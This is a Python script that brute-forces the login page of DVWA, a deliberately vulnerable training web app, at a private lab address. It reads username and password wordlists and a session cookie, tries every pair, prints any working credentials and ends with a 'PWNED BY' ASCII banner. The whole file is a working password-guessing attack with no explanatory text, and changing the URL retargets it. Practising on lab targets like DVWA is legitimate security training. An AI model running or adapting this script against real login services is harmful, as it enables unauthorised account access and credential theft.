import requests
import sys

user_file = open('usernames.lst')
pass_file = open('passwords.lst')  

cookie_file = open('cookie.txt')

sessid=cookie_file.readline().rstrip()

Cookie = {
        "PHPSESSID": sessid,
        "security": 'low'
}

user_list = user_file.readlines()
pass_list = pass_file.readlines()

found = 0

for user in user_list:
    user = user.rstrip()
    if(not user.startswith('#')):
        for pwd in pass_list:
            pwd = pwd.rstrip()
            if(not pwd.startswith('#')):
                sys.stdout.write("\033[A")
                sys.stdout.write("\033[K")
            print (user, "-", pwd)                                  
            headers = {"Content-type":"application/x-www-form-urlencoded", "Accept":"text/html,application/xhtml+xml"}
            post_par ={'username': user, 'password': pwd, 'Login':'Login'}
            risp = requests.get('http://192.168.50.101/dvwa/vulnerabilities/brute/', post_par, cookies=Cookie, allow_redirects=False)
                
            if(risp.text==""):
                print(f"Session id errato")
                found=1
                break
                    
            elif(risp.text.find("Welcome to the") != -1):
                print(f"\nLog in!\nuser: {user}\npassword: {pwd}\n\n\n") 
                found=1
                break
                
    if(found==1): 
        break
print("PWNED BY")
print("\n /$$   /$$ /$$$$$$$$ /$$$$$$$$ /$$$$$$$   /$$$$$$  /$$$$$$ /$$$$$$$  /$$$$$$$$ /$$$$$$$   /$$$$$$")
print("| $$$ | $$| $$_____/|__  $$__/| $$__  $$ /$$__  $$|_  $$_/| $$__  $$| $$_____/| $$__  $$ /$$__  $$")
print("| $$$$| $$| $$         | $$   | $$  \ $$| $$  \ $$  | $$  | $$  \ $$| $$      | $$  \ $$| $$  \__/")
print("| $$ $$ $$| $$$$$      | $$   | $$$$$$$/| $$$$$$$$  | $$  | $$  | $$| $$$$$   | $$$$$$$/|  $$$$$$ ")
print("| $$  $$$$| $$__/      | $$   | $$__  $$| $$__  $$  | $$  | $$  | $$| $$__/   | $$__  $$ \____  $$")
print("| $$\  $$$| $$         | $$   | $$  \ $$| $$  | $$  | $$  | $$  | $$| $$      | $$  \ $$ /$$  \ $$")
print("| $$ \  $$| $$$$$$$$   | $$   | $$  | $$| $$  | $$ /$$$$$$| $$$$$$$/| $$$$$$$$| $$  | $$|  $$$$$$/")
print("|__/  \__/|________/   |__/   |__/  |__/|__/  |__/|______/|_______/ |________/|__/  |__/ \______/ ")
